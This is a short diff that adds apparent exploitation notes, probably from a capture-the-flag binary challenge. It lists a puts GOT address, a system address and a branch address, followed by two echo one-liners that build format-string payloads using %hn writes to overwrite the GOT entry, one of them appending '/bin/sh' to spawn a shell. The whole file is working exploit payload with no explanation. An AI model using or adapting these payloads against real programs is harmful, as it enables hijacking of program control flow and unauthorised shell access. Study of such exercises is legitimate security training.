@@ -1,0 +1,5 @@
+puts: 080499f4
+system: 0x446f60
+after jne: 0x08048691
+echo -e '\xf4\x99\x04\x08\xf6\x99\x04\x08%28504x%6$hn%37092x%7$hn\n/bin/sh'
+echo -e '\xf4\x99\x04\x08\xf6\x99\x04\x08%34441x%6$hn%33139x%7$hn'
